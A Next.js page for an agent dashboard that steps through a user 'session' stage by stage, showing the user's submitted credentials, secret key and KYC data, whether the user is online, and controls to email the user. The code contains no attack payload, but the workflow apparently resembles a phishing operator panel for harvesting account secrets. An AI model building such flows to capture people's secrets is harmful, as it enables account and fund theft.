"use client"

import { useEffect, useState } from "react"
import { Loader, AlertCircle, Mail } from "lucide-react"
import { Alert, AlertDescription } from "@/components/ui/alert"
import { Button } from "@/components/ui/button"
import { useSession } from "@/lib/hooks/useSession"
import { useSessionStore } from "@/lib/stores/sessionStore"
import { SessionHeader } from "@/components/session/SessionHeader"
import { OverviewTab } from "@/components/session/OverviewTab"
import { CaseIdTab } from "@/components/session/CaseIdTab"
import { CredentialsTab } from "@/components/session/CredentialsTab"
import { SecretKeyTab } from "@/components/session/SecretKeyTab"
import { KycTab } from "@/components/session/KycTab"
import { EventTimeline } from "@/components/session/EventTimeline"
import { SessionReport } from "@/components/session/SessionReport"
import { SessionSidebar } from "@/components/session/SessionSidebar"
import { CompletedView } from "@/components/session/CompletedView"
import { AgentNotes } from "@/components/session/AgentNotes"
import { EmailDialog } from "@/components/session/EmailDialog"
import { EmailHistory } from "@/components/session/EmailHistory"
import { STAGE_LABELS, STAGE_DESCRIPTIONS } from "@/lib/constants/sessions"
import { toast } from "sonner"
import type { SessionData } from "@/lib/stores/sessionStore"

export default function SessionDetailPage({
  params,
}: {
  params: Promise<{ id: string }>
}) {
  const [id, setId] = useState<string | null>(null)
  const [loading, setLoading] = useState(true)
  const [error, setError] = useState<string | null>(null)
  const [viewingStage, setViewingStage] = useState<string>("")
  const [emailDialogOpen, setEmailDialogOpen] = useState(false)
  const [emailHistoryOpen, setEmailHistoryOpen] = useState(false)

  // Get session from Zustand store (auto-updates via WebSocket)
  const session = useSession(id)

  // Unwrap params (Next.js 16 pattern)
  useEffect(() => {
    params.then((p) => setId(p.id))
  }, [params])

  // Fetch session details from API once
  // The Zustand store will automatically receive WebSocket updates
  useEffect(() => {
    if (!id) return

    const fetchSession = async () => {
      try {
        setLoading(true)
        setError(null)

        const res = await fetch(`/api/proxy/sessions/${id}`)

        if (!res.ok) {
          throw new Error(`Failed to fetch session: ${res.status}`)
        }

        const data = await res.json()
        // Add to store instead of local state
        useSessionStore.getState().addSession(data)
      } catch (err) {
        const message =
          err instanceof Error ? err.message : "Failed to load session"
        console.error("[SessionDetail] Fetch error:", message)
        setError(message)
      } finally {
        setLoading(false)
      }
    }

    fetchSession()
  }, [id])

  // Initialize viewing stage when session first loads
  useEffect(() => {
    if (session && !viewingStage) {
      setViewingStage(session.stage)
    }
  }, [session?.uuid, viewingStage])

  if (loading) {
    return (
      <div className="flex items-center justify-center py-16">
        <Loader className="w-8 h-8 animate-spin text-muted-foreground" />
      </div>
    )
  }

  if (error || !session) {
    return (
      <Alert className="border-destructive/50 bg-destructive/5">
        <AlertCircle className="h-4 w-4" />
        <AlertDescription className="text-destructive">
          {error || "Session not found"}
        </AlertDescription>
      </Alert>
    )
  }

  const handleRefresh = async () => {
    if (!id) return
    try {
      const res = await fetch(`/api/proxy/sessions/${id}`)
      if (res.ok) {
        const data = await res.json()
        useSessionStore.getState().updateSession(id, data)
        toast.success("Session refreshed", { duration: 2000 })
      }
    } catch (err) {
      toast.error("Failed to refresh session")
    }
  }

  const handleActionComplete = () => {
    handleRefresh()
  }

  return (
    <div className="space-y-6">
      {/* Session Header with integrated controls */}
      <SessionHeader
        sessionId={session.uuid}
        caseId={session.external_case_id}
        stage={session.stage}
        status={session.status as "active" | "completed" | "terminated"}
        userOnline={session.user_online}
        createdAt={session.created_at}
        agent={session.agent_username || session.agent}
        isStaff={true}
        onActionComplete={handleActionComplete}
      />

      {/* 3-Column Layout: Sidebar + Main Content + Right Sidebar */}
      <div className="flex gap-6">
        {/* LEFT SIDEBAR - Step Navigation */}
        <SessionSidebar
          currentStage={session.stage}
          viewingStage={viewingStage}
          onStageClick={setViewingStage}
          sessionId={session.uuid}
        />

        {/* CENTER - Step Content */}
        <div className="flex-1 space-y-6">
          {/* Step Title & Description */}
          <div>
            <h2 className="text-2xl font-bold">
              {STAGE_LABELS[viewingStage as keyof typeof STAGE_LABELS] || "Overview"}
            </h2>
            {STAGE_DESCRIPTIONS[viewingStage as keyof typeof STAGE_DESCRIPTIONS] && (
              <p className="text-muted-foreground mt-1">
                {STAGE_DESCRIPTIONS[viewingStage as keyof typeof STAGE_DESCRIPTIONS]}
              </p>
            )}
          </div>

          {/* Step Content - Conditional Rendering */}
          <div className="space-y-4">
            {viewingStage === "case_id" && (
              <CaseIdTab
                caseId={session.external_case_id}
                userOnline={session.user_online}
                createdAt={session.created_at}
                sessionId={session.uuid}
              />
            )}

            {viewingStage === "credentials" && (
              <CredentialsTab
                credentials={session.user_data?.verified_data?.credentials}
                currentSubmission={session.user_data?.current_submission}
                stage={session.stage}
                sessionId={session.uuid}
                onActionComplete={handleActionComplete}
              />
            )}

            {viewingStage === "secret_key" && (
              <SecretKeyTab
                secretKey={session.user_data?.verified_data?.secret_key}
                currentSubmission={session.user_data?.current_submission}
                stage={session.stage}
                sessionId={session.uuid}
                onActionComplete={handleActionComplete}
              />
            )}

            {viewingStage === "kyc" && (
              <KycTab
                stage={session.stage}
                sessionId={session.uuid}
                currentSubmission={session.user_data?.current_submission}
                verifiedKyc={session.user_data?.verified_data?.kyc}
                onActionComplete={handleActionComplete}
              />
            )}

            {viewingStage === "completed" && (
              <CompletedView
                sessionId={session.uuid}
                caseId={session.external_case_id}
                status={session.status}
                credentialsVerified={!!session.user_data?.verified_data?.credentials?.verified_at}
                secretKeyVerified={!!session.user_data?.verified_data?.secret_key?.verified_at}
                kycStatus={
                  session.stage === "kyc"
                    ? "pending"
                    : session.stage === "completed"
                      ? "verified"
                      : "pending"
                }
                onExport={() => {
                  toast.info("Exporting session report...")
                }}
              />
            )}

            {!["case_id", "credentials", "secret_key", "kyc", "completed"].includes(
              viewingStage
            ) && (
              <OverviewTab
                caseId={session.external_case_id}
                sessionId={session.uuid}
                agent={session.agent_username || session.agent}
                stage={session.stage}
                status={session.status}
                userOnline={session.user_online}
                createdAt={session.created_at}
                updatedAt={session.updated_at}
              />
            )}
          </div>
        </div>

        {/* RIGHT SIDEBAR - Email Controls + Notes → Report → Timeline */}
        <div className="w-96 space-y-6 sticky top-[120px] h-fit">
          {/* Email Controls */}
          <div className="flex gap-2">
            <Button
              onClick={() => setEmailDialogOpen(true)}
              variant="outline"
              size="sm"
              className="flex-1 gap-2"
            >
              <Mail className="w-4 h-4" />
              Send Email
            </Button>
            {session.email_logs && session.email_logs.length > 0 && (
              <Button
                onClick={() => setEmailHistoryOpen(true)}
                variant="outline"
                size="sm"
                className="flex-1"
              >
                History ({session.email_logs.length})
              </Button>
            )}
          </div>

          {/* Agent Notes (For documenting findings) */}
          <AgentNotes
            sessionId={session.uuid}
            notes={session.notes || ""}
            onNotesSaved={(notes) => {
              if (session) {
                useSessionStore.getState().updateSession(session.uuid, { notes })
              }
            }}
          />

          {/* Session Report (Reference/Summary) */}
          <SessionReport
            sessionId={session.uuid}
            caseId={session.external_case_id}
            stage={session.stage}
            status={session.status}
            agent={session.agent_username || session.agent}
            createdAt={session.created_at}
            updatedAt={session.updated_at}
            notes={session.notes}
            credentialsVerified={!!session.user_data?.verified_data?.credentials?.verified_at}
            secretKeyVerified={!!session.user_data?.verified_data?.secret_key?.verified_at}
            kycStatus={
              session.stage === "kyc"
                ? "pending"
                : session.stage === "completed"
                  ? "verified"
                  : "pending"
            }
          />

          {/* Event Timeline (Bottom - Audit Trail) */}
          <EventTimeline sessionId={session.uuid} />
        </div>
      </div>

      {/* Email Dialog */}
      <EmailDialog
        open={emailDialogOpen}
        onOpenChange={setEmailDialogOpen}
        sessionId={session.uuid}
        session={session}
      />

      {/* Email History Sheet */}
      <EmailHistory
        open={emailHistoryOpen}
        onOpenChange={setEmailHistoryOpen}
        sessionId={session.uuid}
        emailLogs={session.email_logs}
      />
    </div>
  )
}
